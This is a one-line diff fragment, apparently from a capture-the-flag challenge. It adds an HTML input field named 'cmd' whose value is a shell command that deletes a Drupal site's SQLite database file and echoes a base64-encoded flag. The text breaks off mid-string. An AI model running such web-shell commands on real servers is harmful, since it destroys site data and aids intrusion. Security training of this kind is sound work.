@@ -1,0 +1,1 @@
+ [truncated]                <input type="text" name="cmd" id="cmd" value="rm  /var/www/html/sites/default/files/.ht.sqlite &amp;&amp; echo SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW5
